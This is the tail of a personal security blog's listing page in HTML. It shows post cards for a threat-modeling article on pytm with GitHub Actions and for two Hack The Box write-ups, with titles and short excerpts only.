                    alt="Automatic Threat Modeling with pytm and Github Actions"
                    loading="lazy"
                >
            </figure>
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">Automatic Threat Modeling with pytm and Github Actions</h3>
                    <p class="gh-card-excerpt is-body">pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated.

I&#39;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>
            <footer class="gh-card-meta">
<!--
             -->
                    <span class="gh-card-author">By Inês Martins</span>
                    <time class="gh-card-date" datetime="2024-11-14">14 Nov 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post">
    <a class="gh-card-link" href="../htb-writeup-formulax/index.html">
            <figure class="gh-card-image">
                <img
                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 160w,
                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 320w,
                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 960w,
                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png.png 1200w,
                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png5.png 2000w"
                    sizes="320px"
                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
                    alt="HTB Write-up | FormulaX (user-only)"
                    loading="lazy"
                >
            </figure>
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">HTB Write-up | FormulaX (user-only)</h3>
                <p class="gh-card-excerpt is-body">Write-up for FormulaX, a retired HTB Linux machine.</p>
            <footer class="gh-card-meta">
<!--
             -->
                    <span class="gh-card-author">By Inês Martins</span>
                    <time class="gh-card-date" datetime="2024-11-13">13 Nov 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                            <article class="gh-card post">
    <a class="gh-card-link" href="../htb-writeup-iclean/index.html">
            <figure class="gh-card-image">
                <img
                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png 160w,
                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png 320w,
                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png 600w,
                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png 960w,
                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png.png 1200w,
                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.59.png9.png 2000w"
                    sizes="320px"
                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.59.png"
                    alt="HTB Write-up | iClean (user-only)"
                    loading="lazy"
                >
            </figure>
        <div class="gh-card-wrapper">
            <h3 class="gh-card-title is-title">HTB Write-up | iClean (user-only)</h3>
                <p class="gh-card-excerpt is-body">Write-up for iClean, a retired HTB Linux machine.</p>
            <footer class="gh-card-meta">
<!--
             -->
                    <span class="gh-card-author">By Inês Martins</span>
                    <time class="gh-card-date" datetime="2024-08-04">04 Aug 2024</time>
                <!--
         --></footer>
        </div>
    </a>
</article>
                    </div>
                </div>
            </section>

    
    <footer class="gh-footer gh-outer">
    <div class="gh-footer-inner gh-inner">

        <div class="gh-footer-bar">
            <span class="gh-footer-logo is-title">
                    
            </span>
            <nav class="gh-footer-menu">
                
            </nav>
            <div class="gh-footer-copyright">
                Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
            </div>
        </div>

    </div>
</footer>    
</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script src="../assets/built/source.js%3Fv=e213fc6d24"></script>



</body>
</html>
